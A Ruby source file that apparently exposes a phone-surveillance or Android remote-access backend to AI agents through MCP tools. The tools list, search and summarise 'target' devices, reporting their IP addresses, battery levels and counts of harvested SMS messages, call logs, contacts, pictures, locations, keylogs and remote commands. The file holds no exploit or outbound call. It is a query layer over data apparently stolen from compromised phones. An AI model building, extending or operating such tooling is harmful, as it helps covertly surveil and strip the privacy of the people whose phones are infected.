# frozen_string_literal: true

module Mcp
  module Tools
    class DeviceTools
      def initialize(server)
        @server = server
      end

      def register
        register_list_devices
        register_get_device
        register_get_device_status
        register_search_devices
        register_get_device_stats
      end

      private

      def register_list_devices
        @server.register_tool(
          name: 'list_devices',
          description: 'List all registered devices with pagination. Returns device ID, name, status, and last activity.',
          input_schema: {
            type: 'object',
            properties: {
              page: { type: 'integer', description: 'Page number (default: 1)', default: 1 },
              per_page: { type: 'integer', description: 'Results per page (max: 100)', default: 25 },
              status: { type: 'string', enum: %w[online offline all], description: 'Filter by status' }
            }
          },
          scope: 'devices:read'
        ) do |args|
          page = [args[:page] || 1, 1].max
          per_page = [[args[:per_page] || McpConfig.default_page_size, 1].max, McpConfig.max_results].min

          devices = Smartphone.includes(:apk_installation).order(last_activity_at: :desc)
          devices = filter_by_status(devices, args[:status]) if args[:status].present?

          total = devices.count
          records = devices.offset((page - 1) * per_page).limit(per_page)

          {
            content: [{
              type: 'text',
              text: {
                devices: records.map { |d| serialize_device_summary(d) },
                pagination: { page: page, per_page: per_page, total: total, pages: (total.to_f / per_page).ceil }
              }.to_json
            }]
          }
        end
      end

      def register_get_device
        @server.register_tool(
          name: 'get_device',
          description: 'Get detailed information about a specific device by its ID.',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' }
            },
            required: ['device_id']
          },
          scope: 'devices:read'
        ) do |args|
          device = find_device(args[:device_id])
          {
            content: [{
              type: 'text',
              text: serialize_device_detail(device).to_json
            }]
          }
        end
      end

      def register_get_device_status
        @server.register_tool(
          name: 'get_device_status',
          description: 'Get the current online/offline status and connection details of a device.',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' }
            },
            required: ['device_id']
          },
          scope: 'devices:read'
        ) do |args|
          device = find_device(args[:device_id])
          installation = device.apk_installation

          {
            content: [{
              type: 'text',
              text: {
                device_id: device.device_id,
                name: device.name,
                online: device.last_activity_at.present? && device.last_activity_at > 5.minutes.ago,
                last_activity: device.last_activity_at&.iso8601,
                battery_level: installation&.battery_level,
                ip_address: installation&.target_ip,
                status: installation&.status
              }.to_json
            }]
          }
        end
      end

      def register_search_devices
        @server.register_tool(
          name: 'search_devices',
          description: 'Search devices by name, device_id, IP address, or tags.',
          input_schema: {
            type: 'object',
            properties: {
              query: { type: 'string', description: 'Search query' },
              field: { type: 'string', enum: %w[name device_id ip tag], description: 'Field to search (default: all)' }
            },
            required: ['query']
          },
          scope: 'devices:read'
        ) do |args|
          query = args[:query].to_s.strip
          results = case args[:field]
                    when 'name'
                      Smartphone.where('name ILIKE ?', "%#{query}%")
                    when 'device_id'
                      Smartphone.where('device_id ILIKE ?', "%#{query}%")
                    when 'ip'
                      Smartphone.joins(:apk_installation)
                                .where('apk_installations.target_ip ILIKE ?', "%#{query}%")
                    when 'tag'
                      Smartphone.joins(apk_installation: :device_tags)
                                .where('device_tags.name ILIKE ?', "%#{query}%")
                    else
                      Smartphone.where('name ILIKE :q OR device_id ILIKE :q', q: "%#{query}%")
                    end

          {
            content: [{
              type: 'text',
              text: {
                results: results.limit(McpConfig.max_results).map { |d| serialize_device_summary(d) },
                count: results.count
              }.to_json
            }]
          }
        end
      end

      def register_get_device_stats
        @server.register_tool(
          name: 'get_device_stats',
          description: 'Get aggregated statistics for a device (messages, calls, locations, etc.).',
          input_schema: {
            type: 'object',
            properties: {
              device_id: { type: 'string', description: 'Device identifier' },
              days: { type: 'integer', description: 'Number of days to aggregate (default: 30)', default: 30 }
            },
            required: ['device_id']
          },
          scope: 'devices:read'
        ) do |args|
          device = find_device(args[:device_id])
          days = [args[:days] || 30, 1].max

          stats = StatisticsService.new(device, days).calculate

          {
            content: [{
              type: 'text',
              text: {
                device_id: device.device_id,
                period_days: days,
                stats: stats
              }.to_json
            }]
          }
        end
      end

      # --- Helpers ---

      def find_device(device_id)
        Smartphone.find_by!(device_id: device_id)
      rescue ActiveRecord::RecordNotFound
        raise McpServer::ToolNotFoundError, "Device not found: #{device_id}"
      end

      def filter_by_status(scope, status)
        case status
        when 'online'
          scope.where('last_activity_at > ?', 5.minutes.ago)
        when 'offline'
          scope.where('last_activity_at <= ? OR last_activity_at IS NULL', 5.minutes.ago)
        else
          scope
        end
      end

      def serialize_device_summary(device)
        {
          device_id: device.device_id,
          name: device.name,
          online: device.last_activity_at.present? && device.last_activity_at > 5.minutes.ago,
          last_activity: device.last_activity_at&.iso8601
        }
      end

      def serialize_device_detail(device)
        installation = device.apk_installation
        {
          device_id: device.device_id,
          name: device.name,
          online: device.last_activity_at.present? && device.last_activity_at > 5.minutes.ago,
          last_activity: device.last_activity_at&.iso8601,
          battery_level: installation&.battery_level,
          ip_address: installation&.target_ip,
          install_status: installation&.status,
          counts: {
            sms_messages: device.sms_messages.count,
            call_logs: device.call_logs.count,
            contacts: device.contacts.count,
            pictures: device.pictures.count,
            locations: device.geo_locations.count,
            keylogs: device.keylogs_count,
            commands: device.commands_count
          }
        }
      end
    end
  end
end
